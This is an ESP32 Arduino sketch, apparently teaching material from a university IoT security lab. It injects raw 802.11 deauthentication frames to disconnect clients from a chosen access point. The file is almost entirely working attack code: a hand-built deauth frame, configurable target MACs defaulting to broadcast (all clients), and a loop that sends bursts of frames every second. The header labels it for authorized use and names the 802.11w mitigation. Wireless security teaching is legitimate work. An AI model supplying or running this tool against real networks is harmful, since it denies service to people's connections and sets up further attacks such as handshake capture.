/*
 * ESP32 Deauthentication Attack
 * Category: WiFi Attacks
 *
 * Injects raw 802.11 deauthentication frames to disconnect a
 * target client from its AP. Demonstrates the WPA2 management
 * frame vulnerability (mitigated by 802.11w/PMF).
 * Configure AP_MAC, CLI_MAC and CH before upload.
 *
 * Board  : ESP32 DevKit V1
 * Library: esp_wifi.h, nvs_flash.h (ESP-IDF bundled)
 * KLS GIT Belagavi — IoT Security Lab | Authorized use only.
 */
#include <esp_wifi.h>
#include <nvs_flash.h>
#include <string.h>

// ===== CONFIGURE BEFORE UPLOAD =====
uint8_t AP_MAC[]  = {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF}; // Target AP BSSID
uint8_t CLI_MAC[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};   // FF:FF... = all clients
uint8_t CH = 6;
int BURSTS = 10;
// ====================================

uint8_t frame[26] = {
  0xC0,0x00, 0x3A,0x01,
  0x00,0x00,0x00,0x00,0x00,0x00,  // addr1: destination client
  0x00,0x00,0x00,0x00,0x00,0x00,  // addr2: source AP
  0x00,0x00,0x00,0x00,0x00,0x00,  // addr3: BSSID
  0x00,0x00,
  0x07,0x00   // Reason 7: Class 3 frame from nonassociated STA
};

void setup() {
  Serial.begin(115200);
  nvs_flash_init();
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_start();
  esp_wifi_set_channel(CH, WIFI_SECOND_CHAN_NONE);
  memcpy(frame+4,  CLI_MAC, 6);
  memcpy(frame+10, AP_MAC,  6);
  memcpy(frame+16, AP_MAC,  6);
  Serial.printf("[*] Deauth Attack — AP %02X:%02X:%02X:%02X:%02X:%02X CH%d\n",
    AP_MAC[0],AP_MAC[1],AP_MAC[2],AP_MAC[3],AP_MAC[4],AP_MAC[5],CH);
}

void loop() {
  for (int i=0; i<BURSTS; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
    delay(5);
  }
  Serial.printf("[*] Sent %d deauth frames\n", BURSTS);
  delay(1000);
}
